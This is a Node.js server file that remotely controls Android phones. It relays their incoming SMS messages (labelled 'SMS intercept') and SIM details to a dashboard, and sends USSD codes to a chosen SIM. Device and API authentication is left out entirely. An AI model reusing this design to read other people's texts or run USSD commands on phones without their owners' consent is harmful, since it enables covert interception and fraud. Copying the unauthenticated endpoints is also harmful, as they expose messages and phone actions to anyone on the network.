const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Multi-device tracking
// Key: JWT or Token, Value: WebSocket connection
const connectedDevices = new Map();

// UI dashboard connections
const dashboardClients = new Set();

wss.on('connection', (ws, req) => {
    // Determine if it's the dashboard UI or an Android App connecting
    const url = new URL(req.url, `http://${req.headers.host}`);
    
    if (url.pathname === '/ui') {
        // UI connected
        dashboardClients.add(ws);
        console.log('UI Dashboard Connected.');
        broadcastToDashboards({ type: 'LOG', message: 'Dashboard connected to server.' });
        
        ws.on('close', () => dashboardClients.delete(ws));
        return;
    }

    // Otherwise, assume it's an Android Device
    // In production, validate req.headers['authorization']
    const deviceAuth = req.headers['authorization'] || `Unknown-${Math.random().toString(36).substr(2, 5)}`;
    connectedDevices.set(deviceAuth, ws);
    
    console.log(`[+] Device connected: ${deviceAuth}`);
    broadcastToDashboards({ type: 'DEVICE_STATUS', device: deviceAuth, status: 'CONNECTED' });

    ws.on('message', (message) => {
        const raw = message.toString();
        let parsed;

        try { parsed = JSON.parse(raw); } catch(e) {
            console.log(`[RAW] ${deviceAuth}: ${raw}`);
            return;
        }

        // ── SMS intercept ─────────────────────────────────
        if (parsed.type === 'DEVICE_SMS') {
            parsed.device = deviceAuth;
            console.log(`[📬 SMS] Device=${deviceAuth} From=${parsed.sender}: ${parsed.body}`);
            broadcastToDashboards(parsed);
            return;
        }

        // ── SIM info ──────────────────────────────────────
        if (parsed.type === 'DEVICE_INFO') {
            const simStr = (parsed.sims || []).map(s => `SIM${s.slot}:${s.carrier}`).join(', ');
            console.log(`[SIM] Device=${deviceAuth}: ${simStr}`);
            broadcastToDashboards({ type: 'DEVICE_SIMS', device: deviceAuth, sims: parsed.sims });
            return;
        }

        // ── USSD Result (execution_id + status + response) ─
        if (parsed.execution_id && parsed.status) {
            const icons = { success:'✅', success_forced:'✅', info:'ℹ️', warning:'⚠️', timeout:'⏱', failed:'❌', error:'❌' };
            const icon = icons[parsed.status] || '?';
            if (parsed.status === 'success' || parsed.status === 'success_forced') {
                console.log(`[${icon} USSD OK] Device=${deviceAuth} ID=${parsed.execution_id}\n  Response: ${parsed.response}`);
            } else if (parsed.status === 'info') {
                console.log(`[${icon} INFO] Device=${deviceAuth} ID=${parsed.execution_id}: ${parsed.response}`);
            } else if (parsed.status === 'warning') {
                console.warn(`[${icon} WARN] Device=${deviceAuth}: ${parsed.response}`);
            } else {
                console.error(`[${icon} ${parsed.status.toUpperCase()}] Device=${deviceAuth} ID=${parsed.execution_id}: ${parsed.response}`);
            }
            broadcastToDashboards({
                type: 'USSD_RESULT',
                device: deviceAuth,
                execution_id: parsed.execution_id,
                status: parsed.status,
                response: parsed.response
            });
            return;
        }

        // ── Unknown ───────────────────────────────────────
        console.log(`[?] ${deviceAuth}:`, parsed);
        broadcastToDashboards({ type: 'DEVICE_MSG', device: deviceAuth, payload: raw });
    });

    ws.on('close', () => {
        console.log(`[-] Device disconnected: ${deviceAuth}`);
        connectedDevices.delete(deviceAuth);
        broadcastToDashboards({ type: 'DEVICE_STATUS', device: deviceAuth, status: 'DISCONNECTED' });
    });
});

// REST fallback for Webhooks
app.post('/api/ussd/response', (req, res) => {
    console.log('[REST] Persistent fallback payload received:', req.body);
    broadcastToDashboards({ type: 'REST_MSG', payload: req.body });
    res.json({ success: true });
});

// API triggered by the UI to send USSD to a device
app.post('/api/trigger', (req, res) => {
    const { device, ussd_code, steps, timeout, sim_slot } = req.body;
    
    const targetWs = connectedDevices.get(device);
    if (!targetWs) {
        return res.status(404).json({ error: "Device not found or offline" });
    }

    const payload = {
        execution_id: "exec_" + Date.now(),
        ussd_code,
        steps: steps || [],
        sim_slot: sim_slot !== undefined ? parseInt(sim_slot) : null,
        timeout: timeout || 15000
    };

    targetWs.send(JSON.stringify(payload));
    console.log(`[->] Sending payload to Android Device (${device}):`, JSON.stringify(payload, null, 2));
    broadcastToDashboards({ type: 'LOG', message: `Sent payload to ${device}: ${JSON.stringify(payload)}` });
    
    res.json({ success: true, payload });
});

app.get('/api/devices', (req, res) => {
    res.json({ devices: Array.from(connectedDevices.keys()) });
});

function broadcastToDashboards(data) {
    dashboardClients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Master Backend listening on http://localhost:${PORT}`);
    console.log(`📱 Type this on your Android URL: ws://<YOUR_LOCAL_WIFI_IP>:${PORT}/ws`);
    
    // Print local IPs
    const { networkInterfaces } = require('os');
    const nets = networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                console.log(`   -> Target IP over WiFi: ws://${net.address}:${PORT}/ws`);
            }
        }
    }
});
